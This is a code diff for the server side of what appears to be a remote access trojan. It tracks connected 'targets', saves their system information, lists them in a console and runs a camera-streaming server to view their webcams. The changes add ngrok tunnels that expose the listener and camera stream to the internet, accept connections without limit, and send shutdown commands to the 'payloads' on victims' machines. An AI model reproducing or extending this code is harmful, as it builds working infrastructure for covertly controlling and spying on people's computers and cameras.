@@ -6,13 +6,29 @@ from prettytable import PrettyTable
 import time
 import json
 import sys
-#from assets.colors import colors
-#from assets.symbols import *
+from assets.colors import colors
+from assets.symbols import *
+from pyngrok import ngrok
+from configparser import ConfigParser
+
+#loading config for ["lhost", "SocketPort", "CameraStreamingPort"]
+CONFIG_FILE = "server/setting/CS-config.ini"
+CONFIG = ConfigParser()
+CONFIG.read(CONFIG_FILE)
+#setting config to var
+HOST = CONFIG["CameraStreaming"]["lhost"]
+PORT = CONFIG["CameraStreaming"]["SocketPort"]
+CAMERA_STREAMING_PORT = CONFIG["CameraStreaming"]["CameraStreamingPort"]
 
 TARGETS = {}
-HOST = socket.gethostbyname(socket.gethostname())
-PORT = 1827
-CAMERA_STREAMING_PORT = 8989
+#start TCP tunnel
+print(f"\r{Splus} {CR.green()}Starting tcp for socket...", end="")
+ngrok.connect(PORT, "tcp")
+print(f"{CR.blue()}Done")
+print(f"\r{Splus} {CR.green()}Starting TCP for CameraStreaming...", end="")
+ngrok.connect(CAMERA_STREAMING_PORT, "tcp")
+print(f"{CR.blue()}Done")
+
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((HOST , PORT))
 server.listen(10)
@@ -69,12 +85,13 @@ def help(TYPE):
 def recv_target_info(target):
     DATA = target.recv(99999).decode()
     if json.loads(DATA):
-        with open(f"{target.getsockname()[0]}.json", "w") as info_save:
+        with open(f"target_info/{target.getsockname()[0]}.json", "w") as info_save:
             json.dump(json.loads(DATA), info_save, indent=6)
         info_save.close()
         with open(f"{target.getsockname()[0]}.json", "r") as info:
             for x, y in enumerate(dict(json.load(info)).items()):
                 print(f"{' '*7}{CR.green()} {y[0]}{CR.yellow()} --> {CR.blue()}{y[1]}{CR.white()}")
+
 def StartCameraStreamingServer(host, port):
     global CAMERA_STREAMING    
     CAMERA_STREAMING = StreamingServer(host, port)
@@ -88,7 +105,12 @@ def StopCameraStreamingServer() :
 def TARGETS_SHOWER():
     TARGET_TABLE = PrettyTable([f"{CR.red()}ip{CR.white()}", f"{CR.red()}port{CR.white()}"])
     for x in TARGETS:
-        TARGET_TABLE.add_row([f"{CR.green()}{TARGETS[x][0]}{CR.white()}", f"{CR.green()}{TARGETS[x][1]}{CR.white()}"])
+        try :
+            x.send("".encode())
+            time.sleep(0.1)
+            TARGET_TABLE.add_row([f"{CR.green()}{TARGETS[x][0]}{CR.white()}", f"{CR.green()}{TARGETS[x][1]}{CR.white()}"])
+        except:
+            pass
     print(TARGET_TABLE)
 
 def connect_with_host(target_add):
@@ -141,19 +163,21 @@ def connect_with_host(target_add):
             break
 
 def upcoming_connection():
-    for x in range(10):
+    while True:
         add, ip = server.accept()
-        print(f"{Splus} {CR.green()}Target connected {CR.yellow()} |{CR.red()} Host> {CR.blue()}{ip[0]} {CR.red()}Port> {CR.blue()}{ip[1]}")
+        print(f"\n{Splus} {CR.green()}Target connected {CR.yellow()} |{CR.red()} Host> {CR.blue()}{ip[0]} {CR.red()}Port> {CR.blue()}{ip[1]}\n")
         if add in TARGETS:
             pass
         else:
             TARGETS[add] = ip
 
+#Threads
+UPCOMING_CONN_THREAD = threading.Thread(target=upcoming_connection)
+
 def run():
-    print(f"{Ssowrd} {CR.green()}Waiting for any upcoming connecting...")
-    UPCOMING_CONN_THREAD = threading.Thread(target=upcoming_connection())
-    UPCOMING_CONN_THREAD.daemon = True
+    #starting threads
     UPCOMING_CONN_THREAD.start()
+    #console for server
     while True:
         COMMAND_INPUT = input(f"\r   {CR.red()} <|{CR.green()}server{CR.red()}|>{CR.blue()}|{CR.white()}=> {CR.white()}")
         if COMMAND_INPUT == "show targets":
@@ -173,6 +197,8 @@ def run():
                 "command" : "stop connection"
                 }
             for x in TARGETS:
-                x.send(json.dumps(SHUTDOWN_MSG).encode())
-                x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit()
-run()
+                try:
+                    time.sleep(1)
+                    x.send(json.dumps(SHUTDOWN_MSG).encode())
+                except:
+                    x.shutdown(socket.SHUT_RDWR);server.close(); time.sleep(1); sys.exit() #just to make sure all the targets that are connected close the connection and shuting the payloads down
